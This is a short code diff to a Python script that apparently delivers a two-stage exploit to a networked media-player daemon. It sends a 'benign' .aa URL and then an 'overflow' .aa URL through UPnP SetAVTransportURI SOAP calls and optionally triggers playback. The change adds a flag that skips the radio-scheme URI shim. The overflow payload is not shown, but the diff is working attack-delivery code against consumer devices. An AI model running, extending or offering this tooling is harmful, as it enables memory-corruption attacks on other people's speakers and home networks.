@@ -51,6 +51,7 @@ def main():
     ap.add_argument("--stage1", help="benign .aa URL (transport bind)")
     ap.add_argument("--stage2", required=True, help="overflow .aa URL")
     ap.add_argument("--wait", type=float, default=3.0, help="seconds between stages")
+    ap.add_argument("--no-shim", action="store_true", help="send the http:// URI as-is")
     ap.add_argument("--no-play", action="store_true")
     ap.add_argument("--timeout", type=float, default=20.0)
     args = ap.parse_args()
@@ -60,7 +61,7 @@ def main():
             continue
         # the daemon plays http media through the radio shim; bare http:// is
         # accepted by SetAVTransportURI but never fetched by the transport
-        if uri.startswith("http://"):
+        if uri.startswith("http://") and not args.no_shim:
             uri = "x-rincon-mp3radio://" + uri
         print("%s SETAV %s -> %s" % (name, uri, soap(args.ip, "SetAVTransportURI", BODY.format(uri=uri), args.timeout)))
         if not args.no_play:
